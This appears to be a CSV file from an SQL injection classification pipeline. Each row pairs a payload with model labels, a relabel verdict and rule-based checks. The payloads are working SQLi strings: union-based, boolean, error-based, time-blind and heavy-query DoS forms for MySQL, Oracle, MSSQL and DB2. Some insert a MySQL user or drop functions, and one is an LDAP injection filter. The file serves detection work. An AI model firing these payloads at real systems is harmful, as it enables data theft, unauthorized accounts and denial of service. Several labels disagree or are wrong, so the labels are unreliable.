payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",union_based,generic,0.85,UNION ALL SELECT for union-based SQLi,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,18147,boolean_blind,generic,Pattern match: 'and 1 = 0' → boolean_blind (P3); DB signature: generic,union_based,generic,UNION SELECT structure,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"
truncate,benign,generic,0.6,truncate is DML not attack standalone,RELABEL,confidence too low (0.60),benign,generic,18148,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,truncate
"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""",RELABEL,reasoning too short (2 chars),boolean_blind,mysql,18149,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "", ( "" or 1 = 1 -- 1"
"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""",RELABEL,reasoning too short (2 chars),boolean_blind,mysql,18150,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "",{"" or 1 = 1 -- 1"
"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )",stacked_queries,mysql,0.95,INSERT into mysql.user for MySQL stacked queries,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,18151,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )"
exec sp,benign,generic,0.6,exec sp requires stored proc context,RELABEL,confidence too low (0.60),benign,generic,18152,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,exec sp
1;SELECT *,stacked_queries,generic,0.8,1;SELECT * is stacked query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,18153,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1;SELECT *
procedure,benign,generic,0.6,procedure is SQL keyword not attack,RELABEL,confidence too low (0.60),benign,generic,18154,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,procedure
\'; desc users; --,benign,mysql,0.6,desc users is meta not attack standalone,RELABEL,confidence too low (0.60),benign,mysql,18155,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,\'; desc users; --
1 uni on select all from where,union_based,mysql,0.8,uni/**/on for obfuscated union SQLi,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,18156,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 uni on select all from where
"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",union_based,mysql,0.85,@#\,RELABEL,reasoning too short (3 chars),union_based,mysql,18157,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1"
"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""",RELABEL,reasoning too short (2 chars),boolean_blind,mysql,18158,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1"
sqlvuln;,benign,generic,0.6,sqlvuln requires context,RELABEL,confidence too low (0.60),benign,generic,18159,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,sqlvuln;
( select top 1,benign,generic,0.6,select top 1 requires context,RELABEL,confidence too low (0.60),benign,generic,18160,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( select top 1
"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1",union_based,mysql,0.85,#\,RELABEL,reasoning too short (2 chars),union_based,mysql,18161,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1"
declare @s varchar ( 22 ) select @s =,benign,generic,0.6,declare @s requires context,RELABEL,confidence too low (0.60),benign,generic,18162,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,declare @s varchar ( 22 ) select @s =
"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1",union_based,mysql,0.85,"#\\""",RELABEL,reasoning too short (4 chars),union_based,mysql,18163,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1"
@variable,benign,generic,0.5,@variable is variable reference,RELABEL,confidence too low (0.50),benign,generic,18164,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,@variable
"select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""",RELABEL,reasoning too short (2 chars),boolean_blind,mysql,18165,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1"
"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""",RELABEL,reasoning too short (2 chars),boolean_blind,mysql,18166,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1"
replace,unknown,generic,0.5,Plain word not recognizable SQL,RELABEL,type='unknown' needs verification; confidence too low (0.50),unknown,generic,18167,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,replace
* ( | ( objectclass = * ) ),unknown,generic,0.5,Cannot recognize LDAP syntax,RELABEL,type='unknown' needs verification; confidence too low (0.50),unknown,generic,18168,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,* ( | ( objectclass = * ) )
limit,unknown,generic,0.5,Plain SQL keyword not an attack,RELABEL,type='unknown' needs verification; confidence too low (0.50),unknown,generic,18169,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,limit
# from wapiti,unknown,generic,0.6,Comment syntax not recognizable,RELABEL,type='unknown' needs verification; confidence too low (0.60),unknown,generic,18170,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,# from wapiti
"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.9,extractvalue() for XML error-based,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,18171,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --"
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",heavy_query,oracle,0.85,Multiple table join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18172,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil"
"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",error_based,oracle,0.9,updatexml() for Oracle error-based,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,18173,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'"
"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",error_based,mysql,0.85,exp() with XOR for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,18174,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi"
"1' in boolean mode ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",heavy_query,db2,0.85,IBM DB2 systables for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,18175,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1' in boolean mode ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #"
"1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Multiple all_users table join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18176,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh",time_blind,postgresql,0.85,regexp_substring for time-based blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,18177,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh"
( 1589 = 1589 ) *1,unknown,generic,0.6,Simple numeric comparison not clear attack,RELABEL,type='unknown' needs verification; confidence too low (0.60),unknown,generic,18178,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,( 1589 = 1589 ) *1
-5021'+ ( select yadq where 4285 = 4285 order by 1#,union_based,generic,0.85,UNION SELECT for union-based,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,18179,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-5021'+ ( select yadq where 4285 = 4285 order by 1#
"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",error_based,mysql,0.85,exp() with concat for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,18180,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '"
if ( 8284 = 6171 ) select 8284 else drop function mbih--,stacked_queries,mysql,0.9,IF-select for conditional stacked queries,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,18181,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,if ( 8284 = 6171 ) select 8284 else drop function mbih--
"-7868"" ) ) or 9323 = 9323#",unknown,generic,0.75,Cannot determine attack type,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,18182,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-7868"" ) ) or 9323 = 9323#"
"1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,Multiple sysusers table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18183,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
-7999 ) or 8422 = 1336,unknown,generic,0.6,Mixed operator not clear attack,RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,18184,boolean_blind,generic,Pattern match: 'or 8422 = 1336' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7999 ) or 8422 = 1336
"1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,generic,0.85,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,18185,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #"
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'njnr' = 'njnr",heavy_query,db2,0.85,Multiple systables join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,18186,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'njnr' = 'njnr"
"end and ( ( ""rqay"" like ""rqay",unknown,generic,0.6,END keyword without context,RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,18187,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"end and ( ( ""rqay"" like ""rqay"
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( '%' = '",heavy_query,db2,0.85,Multiple systables join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,18188,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( '%' = '"
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",time_blind,postgresql,0.85,regexp_substring for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,18189,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142"
"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",heavy_query,mssql,0.85,Multiple sysusers table join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18190,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc"
"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",heavy_query,mysql,0.85,Multiple domain table join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18191,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao"
if ( 8858 = 5680 ) select 8858 else drop function pyuo--,stacked_queries,mysql,0.9,IF with DROP for stacked queries,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'stacked_queries' (P8),boolean_blind,generic,18192,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,if ( 8858 = 5680 ) select 8858 else drop function pyuo--
"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748",time_blind,mysql,0.9,benchmark() with procedure analyse,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'time_blind' (P5),error_based,mysql,18193,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748"
"end and ( ""qkkn"" like ""qkkn",unknown,generic,0.6,END keyword without context,RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,18194,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"end and ( ""qkkn"" like ""qkkn"
"1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,generic,0.85,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,18195,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #"
"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",heavy_query,mysql,0.85,Multiple domain table join for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18196,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )"
"1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",heavy_query,mysql,0.85,Multiple domain table join with concat,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,18197,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'"
"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul",error_based,generic,0.85,Floor/rand for error-based extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,18198,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul"
